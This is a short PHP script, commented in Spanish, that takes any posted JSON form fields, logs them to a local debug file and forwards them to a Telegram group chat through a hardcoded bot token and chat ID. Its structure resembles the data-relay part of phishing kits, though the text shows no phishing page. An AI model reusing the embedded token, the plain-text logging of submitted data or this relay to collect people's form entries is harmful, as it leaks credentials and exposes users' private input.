<?php
// Configuración del bot
$bot_token = '8331329619:AAGmlfI5TTvvwEp32j_9HHAoIZa9P6-lris';
$chat_id   = '-4969796662';

// Leer JSON
$inputData = json_decode(file_get_contents('php://input'), true);

// Log para depuración
file_put_contents(__DIR__.'/debug_envio.log', date('c').' | inputData: '.print_r($inputData, true)."\n", FILE_APPEND);

// Validar que haya algo
if(empty($inputData)) {
    echo json_encode(['status'=>'error','message'=>'No se recibieron datos']);
    exit;
}

// Construir mensaje dinámico
$message = "";
foreach($inputData as $key => $value) {
    $label = strtoupper(str_replace(['txt-', '_'], ['', ' '], $key)); // conviente txt-nombre -> NOMBRE
    $message .= "📝 <b>$label:</b> | <i>$value</i>\n";
}

// Enviar a Telegram
$telegram_api_url = "https://api.telegram.org/bot{$bot_token}/sendMessage";
$telegram_data = [
    'chat_id' => $chat_id,
    'text' => $message,
    'parse_mode' => 'HTML'
];

$ch = curl_init($telegram_api_url);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($telegram_data));
$response = curl_exec($ch);
$curl_error = curl_error($ch);
curl_close($ch);

// Log de la respuesta
file_put_contents(__DIR__.'/debug_envio.log', date('c').' | Telegram response: '.print_r($response,true)." | curl_error: $curl_error\n", FILE_APPEND);

// Responder al JS
if ($response !== false) {
    $response_data = json_decode($response,true);
    echo json_encode(['status'=>!empty($response_data['ok']) ? 'success':'error','response'=>$response]);
} else {
    echo json_encode(['status'=>'error','curl_error'=>$curl_error]);
}
